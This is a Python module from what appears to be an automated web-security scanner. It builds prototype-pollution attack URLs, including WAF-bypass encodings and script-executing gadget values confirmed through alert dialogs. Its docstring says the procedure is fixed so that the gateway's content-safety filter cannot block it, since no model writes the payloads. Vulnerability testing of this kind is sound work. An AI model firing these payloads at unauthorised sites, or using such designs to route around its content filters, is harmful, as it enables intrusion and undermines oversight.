"""
Pure, browser-free helpers for the deterministic ``prototype_pollution_probe`` tool.

Client-side prototype pollution is confirmed by a FIXED procedure the gateway's content-safety
filter cannot block, because no language model generates any payload:

  1. Pollute a unique *sentinel* property through a URL vector (``?__proto__[<key>]=<value>``,
     the ``constructor[prototype]`` chain, the ``location.hash`` variants, nested-merge shapes,
     and WAF-bypass encodings), then read ``Object.prototype[<key>]`` on the live page. If it
     equals the sentinel value, that source pollutes ``Object.prototype``.
  2. For each gadget in the library, re-pollute the gadget's property with a JS-exec value
     (e.g. ``transport_url`` = ``data:,alert(<marker>);``) and confirm via a captured
     ``alert(<marker>)`` dialog — the dialog message must carry the probe's unique marker,
     so an ambient alert can never match.

Everything here is a pure function over strings — no browser, no network — so the vector
construction and matching logic is unit-testable in isolation. The tool layer
(``dast/tools/protopollute_tools.py``) wires these to the live ``AgentBrowser``.
"""

from __future__ import annotations

import secrets
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlsplit, urlunsplit

from dast.payloads.loader import get_value

# JS read-back: build a FRESH empty object literal and read the sentinel key off it. If the
# source polluted Object.prototype, the empty object inherits the value. ``k`` is passed as the
# evaluate() argument (never string-interpolated), so the sentinel key cannot break out of JS.
READ_PROTO_JS = "(k)=>({})[k]"

# Source-vector templates, emitted IN THIS ORDER. Each is a raw URL suffix with ``{k}`` (the
# polluted property name) and ``{v}`` (its value) placeholders. ``?``-prefixed vectors live in
# the query string; ``#``-prefixed vectors live in the fragment (``location.hash`` DOM sinks).
# Labels are stable identifiers so a confirmed gadget can be rebuilt on the same vector shape.
_VECTOR_TEMPLATES: List[Tuple[str, str]] = [
    ("proto_query", "?__proto__[{k}]={v}"),
    ("constructor_prototype_query", "?constructor[prototype][{k}]={v}"),
    ("proto_hash", "#__proto__[{k}]={v}"),
    ("constructor_prototype_hash", "#constructor[prototype][{k}]={v}"),
    ("proto_hash_amp", "#x=y&__proto__[{k}]={v}"),
    ("proto_nested_query", "?a[__proto__][{k}]={v}"),
    ("proto_nested2_query", "?a[b][__proto__][{k}]={v}"),
    ("proto_encoded_query", "?__pro%74o__[{k}]={v}"),
    ("constructor_prototype_encoded_query", "?constructor%5bprototype%5d%5b{k}%5d={v}"),
]

_VECTOR_BY_LABEL: Dict[str, str] = {label: tmpl for label, tmpl in _VECTOR_TEMPLATES}


def make_sentinel() -> Tuple[str, str]:
    """Return a unique ``(key, value)`` sentinel pair for one probe run.

    Key ``fr_pp_<rand>`` is a property name unlikely to collide with any app property; value
    ``polluted_<rand>`` is what ``Object.prototype[key]`` must equal to prove the source polluted
    the prototype. Both share the same random token so the pair is correlated and unguessable."""
    rand = secrets.token_hex(4)
    return f"fr_pp_{rand}", f"polluted_{rand}"


def _base_root(base_url: str) -> str:
    """The scheme://netloc/path of ``base_url`` with any existing query/fragment stripped, so a
    source-vector suffix (``?...`` or ``#...``) attaches cleanly and deterministically."""
    parts = urlsplit(base_url)
    return urlunsplit((parts.scheme, parts.netloc, parts.path, "", ""))


def _apply(base_url: str, template: str, k: str, v: str) -> str:
    """Build a full URL: the base root plus the vector suffix with ``{k}``/``{v}`` substituted."""
    suffix = template.replace("{k}", k).replace("{v}", v)
    return _base_root(base_url) + suffix


def source_vectors(base_url: str, k: str, v: str) -> List[Tuple[str, str]]:
    """Return ``[(label, url), ...]`` — every source vector for sentinel property ``k`` = ``v``,
    in the fixed emission order. Each URL is the base page with the vector suffix applied."""
    return [(label, _apply(base_url, tmpl, k, v)) for label, tmpl in _VECTOR_TEMPLATES]


def gadget_url(base_url: str, source_label: str, gadget: Dict[str, Any], marker: str) -> str:
    """Rebuild the URL that pollutes ``gadget``'s property with its JS-exec value on the vector
    shape identified by ``source_label``. The gadget's ``value`` has its ``{marker}`` placeholder
    replaced with the run marker first (e.g. ``data:,alert(<marker>);``), so a fired dialog echoes
    the marker. Falls back to the ``proto_query`` shape for an unknown label."""
    template = _VECTOR_BY_LABEL.get(source_label, _VECTOR_BY_LABEL["proto_query"])
    prop = str(gadget.get("property", ""))
    value = str(gadget.get("value", "")).replace("{marker}", marker)
    return _apply(base_url, template, prop, value)


def marker_in_dialog(dialog: Optional[Any], marker: str) -> bool:
    """True iff a dialog fired AND its message carries the run marker. A dict (``{type,message}``)
    or a bare string message are both accepted; anything falsy / markerless returns False."""
    if not dialog or not marker:
        return False
    if isinstance(dialog, dict):
        msg = str(dialog.get("message", ""))
    else:
        msg = str(dialog)
    return marker in msg


def load_gadgets() -> List[Dict[str, Any]]:
    """Read the gadget library from ``prototype_pollution.yaml`` (top-level ``gadgets:`` list).
    Each entry is a dict with at least ``name``, ``property``, ``value`` (containing ``{marker}``),
    an optional ``sink`` note, and an optional ``trigger`` (load|reload|interact)."""
    gadgets = get_value("prototype_pollution", "gadgets", []) or []
    return [g for g in gadgets if isinstance(g, dict) and g.get("property")]
